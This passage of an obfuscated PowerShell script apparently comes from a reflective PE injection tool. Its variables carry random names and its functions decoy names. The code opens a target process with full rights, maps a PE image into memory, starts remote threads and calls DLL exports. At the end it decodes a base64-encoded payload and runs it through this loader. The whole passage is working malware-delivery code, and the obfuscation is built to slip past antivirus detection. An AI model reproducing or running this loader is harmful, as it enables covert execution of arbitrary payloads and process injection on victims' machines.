            [IntPtr]$tORscXeh99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
            [System.Runtime.InteropServices.Marshal]::WriteByte($tORscXeh99, 0, 0x00)
            $VHsMiunx99 = whimsey -PEInfo $PEInfo -dxaeqnSI99 $dxaeqnSI99 -Win32Constants $Win32Constants -bzbQFMbZ99 $CQEIQBeg99 -tORscXeh99 $tORscXeh99

            [IntPtr]$CShXjQxR99 = recessives ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            Write-Verbose "Call EXE Main function. Address: $(laundries $CShXjQxR99). Creating thread for the EXE to run in."

            $dxaeqnSI99.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $CShXjQxR99, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

            while($true)
            {
                [Byte]$ifDwjaxL99 = [System.Runtime.InteropServices.Marshal]::ReadByte($tORscXeh99, 0)
                if ($ifDwjaxL99 -eq 1)
                {
                    Cuisinart -YefUqSNV99 $VHsMiunx99 -dxaeqnSI99 $dxaeqnSI99 -Win32Constants $Win32Constants
                    Write-Verbose "EXE thread has completed."
                    break
                }
                else
                {
                    Start-Sleep -Seconds 1
                }
            }
        }

        return @($PEInfo.PEHandle, $koQJmfmE99)
    }


    Function teammate
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $BHTRESUz99
        )

        $Win32Constants = duteous
        $dxaeqnSI99 = cracked
        $TIzknaum99 = sooner

        $PEInfo = hardware -BHTRESUz99 $BHTRESUz99 -TIzknaum99 $TIzknaum99 -Win32Constants $Win32Constants

        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$yZlaaofg99 = recessives ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)

            while ($true)
            {
                $KytvNJgL99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($yZlaaofg99, [Type]$TIzknaum99.IMAGE_IMPORT_DESCRIPTOR)

                if ($KytvNJgL99.Characteristics -eq 0 `
                        -and $KytvNJgL99.FirstThunk -eq 0 `
                        -and $KytvNJgL99.ForwarderChain -eq 0 `
                        -and $KytvNJgL99.Name -eq 0 `
                        -and $KytvNJgL99.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done unloading the libraries needed by the PE"
                    break
                }

                $hlhZttsE99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((recessives ([Int64]$PEInfo.PEHandle) ([Int64]$KytvNJgL99.Name)))
                $tBdAUFcc99 = $dxaeqnSI99.GetModuleHandle.Invoke($hlhZttsE99)

                if ($tBdAUFcc99 -eq $null)
                {
                    Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $hlhZttsE99. Continuing anyways" -WarningAction Continue
                }

                $lKwXcapb99 = $dxaeqnSI99.FreeLibrary.Invoke($tBdAUFcc99)
                if ($lKwXcapb99 -eq $false)
                {
                    Write-Warning "Unable to free library: $hlhZttsE99. Continuing anyways." -WarningAction Continue
                }

                $yZlaaofg99 = recessives ($yZlaaofg99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TIzknaum99.IMAGE_IMPORT_DESCRIPTOR))
            }
        }

        Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
        $XHrcBVlA99 = recessives ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        $MYKdepco99 = turtle @([IntPtr], [UInt32], [IntPtr]) ([Bool])
        $mnrXLTkE99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($XHrcBVlA99, $MYKdepco99)

        $mnrXLTkE99.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null


        $lKwXcapb99 = $dxaeqnSI99.VirtualFree.Invoke($BHTRESUz99, [UInt64]0, $Win32Constants.MEM_RELEASE)
        if ($lKwXcapb99 -eq $false)
        {
            Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
        }
    }


    Function Main
    {
        $dxaeqnSI99 = cracked
        $TIzknaum99 = sooner
        $Win32Constants =  duteous

        $zBmOaylB99 = [IntPtr]::Zero

        if (($rtbgUvGc99 -ne $null) -and ($rtbgUvGc99 -ne 0) -and ($YvoMLSII99 -ne $null) -and ($YvoMLSII99 -ne ""))
        {
            Throw "Can't supply a ProcId and ProcName, choose one or the other"
        }
        elseif ($YvoMLSII99 -ne $null -and $YvoMLSII99 -ne "")
        {
            $jgYqQYZD99 = @(Get-Process -Name $YvoMLSII99 -ErrorAction SilentlyContinue)
            if ($jgYqQYZD99.Count -eq 0)
            {
                Throw "Can't find process $YvoMLSII99"
            }
            elseif ($jgYqQYZD99.Count -gt 1)
            {
                $FClFDGwE99 = Get-Process | Where-Object { $_.Name -eq $YvoMLSII99 } | Select-Object ProcessName, Id, SessionId
                Write-Output $FClFDGwE99
                Throw "More than one instance of $YvoMLSII99 found, please specify the process ID to inject in to."
            }
            else
            {
                $rtbgUvGc99 = $jgYqQYZD99[0].ID
            }
        }


        if (($rtbgUvGc99 -ne $null) -and ($rtbgUvGc99 -ne 0))
        {
            $zBmOaylB99 = $dxaeqnSI99.OpenProcess.Invoke(0x001F0FFF, $false, $rtbgUvGc99)
            if ($zBmOaylB99 -eq [IntPtr]::Zero)
            {
                Throw "Couldn't obtain the handle for process ID: $rtbgUvGc99"
            }

            Write-Verbose "Got the handle for the remote process to inject in to"
        }


        Write-Verbose "Calling salvers"
        $BHTRESUz99 = [IntPtr]::Zero
        if ($zBmOaylB99 -eq [IntPtr]::Zero)
        {
            $tgPyNFlj99 = salvers -mhtSMDwv99 $mhtSMDwv99 -CQEIQBeg99 $CQEIQBeg99 -CSQXLYeO99 $CSQXLYeO99
        }
        else
        {
            $tgPyNFlj99 = salvers -mhtSMDwv99 $mhtSMDwv99 -CQEIQBeg99 $CQEIQBeg99 -zBmOaylB99 $zBmOaylB99 -CSQXLYeO99 $CSQXLYeO99
        }
        if ($tgPyNFlj99 -eq [IntPtr]::Zero)
        {
            Throw "Unable to load PE, handle returned is NULL"
        }

        $BHTRESUz99 = $tgPyNFlj99[0]
        $FAsoLPeE99 = $tgPyNFlj99[1] #only matters if you loaded in to a remote process


        $PEInfo = hardware -BHTRESUz99 $BHTRESUz99 -TIzknaum99 $TIzknaum99 -Win32Constants $Win32Constants
        if (($PEInfo.FileType -ieq "DLL") -and ($zBmOaylB99 -eq [IntPtr]::Zero))
        {
            switch ($YNZILtmz99)
            {
                'WString' {
                    Write-Verbose "Calling function with WString return type"
                    [IntPtr]$OWDNYcAg99 = muscle -BHTRESUz99 $BHTRESUz99 -FunctionName "WStringFunc"
                    if ($OWDNYcAg99 -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $jhZCRUfu99 = turtle @() ([IntPtr])
                    $RDVHaGNL99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OWDNYcAg99, $jhZCRUfu99)
                    [IntPtr]$csSBiIqB99 = $RDVHaGNL99.Invoke()
                    $CroZLWSx99 = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($csSBiIqB99)
                    Write-Output $CroZLWSx99
                }

                'String' {
                    Write-Verbose "Calling function with String return type"
                    [IntPtr]$Mphpqzps99 = muscle -BHTRESUz99 $BHTRESUz99 -FunctionName "StringFunc"
                    if ($Mphpqzps99 -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $YXpnhhFA99 = turtle @() ([IntPtr])
                    $NIFWYzvD99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($Mphpqzps99, $YXpnhhFA99)
                    [IntPtr]$csSBiIqB99 = $NIFWYzvD99.Invoke()
                    $CroZLWSx99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($csSBiIqB99)
                    Write-Output $CroZLWSx99
                }

                'Void' {
                    Write-Verbose "Calling function with Void return type"
                    [IntPtr]$qtFLPkXy99 = muscle -BHTRESUz99 $BHTRESUz99 -FunctionName "VoidFunc"
                    if ($qtFLPkXy99 -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $DTKQeEhq99 = turtle @() ([Void])
                    $gAnEbtPU99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($qtFLPkXy99, $DTKQeEhq99)
                    $gAnEbtPU99.Invoke() | Out-Null
                }
            }
        }
        elseif (($PEInfo.FileType -ieq "DLL") -and ($zBmOaylB99 -ne [IntPtr]::Zero))
        {
            $qtFLPkXy99 = muscle -BHTRESUz99 $BHTRESUz99 -FunctionName "VoidFunc"
            if (($qtFLPkXy99 -eq $null) -or ($qtFLPkXy99 -eq [IntPtr]::Zero))
            {
                Throw "VoidFunc couldn't be found in the DLL"
            }

            $qtFLPkXy99 = timelines $qtFLPkXy99 $BHTRESUz99
            $qtFLPkXy99 = recessives $qtFLPkXy99 $FAsoLPeE99

            $Null = indissoluble -blAqmNlp99 $zBmOaylB99 -StartAddress $qtFLPkXy99 -dxaeqnSI99 $dxaeqnSI99
        }

        if ($zBmOaylB99 -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
        {
            teammate -BHTRESUz99 $BHTRESUz99
        }
        else
        {
            $lKwXcapb99 = $dxaeqnSI99.VirtualFree.Invoke($BHTRESUz99, [UInt64]0, $Win32Constants.MEM_RELEASE)
            if ($lKwXcapb99 -eq $false)
            {
                Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
            }
        }

        Write-Verbose "Done!"
    }

    Main
}

Function Main
{
    if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
    {
        $zIznIWcK99  = "Continue"
    }

    Write-Verbose "PowerShell ProcessID: $PID"

    $zWopgLYY99 = ($mhtSMDwv99[0..1] | ForEach-Object {[Char] $_}) -join ''

    if ($zWopgLYY99 -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

    if (-not $JHsLgehC99) {
        $mhtSMDwv99[0] = 0
        $mhtSMDwv99[1] = 0
    }

    if ($CQEIQBeg99 -ne $null -and $CQEIQBeg99 -ne '')
    {
        $CQEIQBeg99 = "ReflectiveExe $CQEIQBeg99"
    }
    else
    {
        $CQEIQBeg99 = "ReflectiveExe"
    }

    if ($aWAGSJJc99 -eq $null -or $aWAGSJJc99 -imatch "^\s*$")
    {
        Invoke-Command -ScriptBlock $ETTqvhFE99 -ArgumentList @($mhtSMDwv99, $YNZILtmz99, $rtbgUvGc99, $YvoMLSII99,$CSQXLYeO99)
    }
    else
    {
        Invoke-Command -ScriptBlock $ETTqvhFE99 -ArgumentList @($mhtSMDwv99, $YNZILtmz99, $rtbgUvGc99, $YvoMLSII99,$CSQXLYeO99) -aWAGSJJc99 $aWAGSJJc99
    }
}

Main
}

 
$mhtSMDwv99 = [System.Convert]::FromBase64String($WiJlKevF99)
disheveling -mhtSMDwv99 $mhtSMDwv99 -CQEIQBeg99 $arguments